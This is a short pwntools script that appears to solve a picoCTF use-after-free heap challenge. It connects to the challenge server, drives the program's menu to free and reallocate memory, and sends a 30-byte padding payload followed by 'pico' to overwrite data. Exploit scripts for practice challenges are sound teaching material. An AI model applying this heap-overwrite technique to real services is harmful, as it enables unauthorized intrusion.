from pwn import *

# GOATS
#  https://www.ctfrecipes.com/pwn/heap-exploitation/use-after-free

host = 'tethys.picoctf.net'
port = 59190
io = remote(host, port)

response = io.recv()
io.sendline(b'5')
response = io.recv()
print(response)

io.sendline(b'2')
io.recv()
io.sendline(b'35')
io.recv()
payload = b'A' * 30 
payload += b'pico'
io.sendline(payload)
response = io.recv()
io.sendline(b'4')
response = io.recv()
print(response)
